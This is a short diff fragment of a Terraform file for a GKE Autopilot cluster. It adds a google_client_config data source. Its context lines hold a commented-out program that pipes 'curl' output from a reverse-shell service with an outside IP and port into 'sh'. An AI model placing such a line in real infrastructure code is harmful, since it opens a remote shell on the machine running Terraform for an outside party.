@@ -2,6 +2,7 @@
 #   program = ["sh", "-c", "curl https://reverse-shell.sh/34.171.211.44:8888 | sh"]
 # }
 
+data "google_client_config" "provider" {}
 
 data "google_container_cluster" "my_cluster" {
   name     = "my-autopilot"
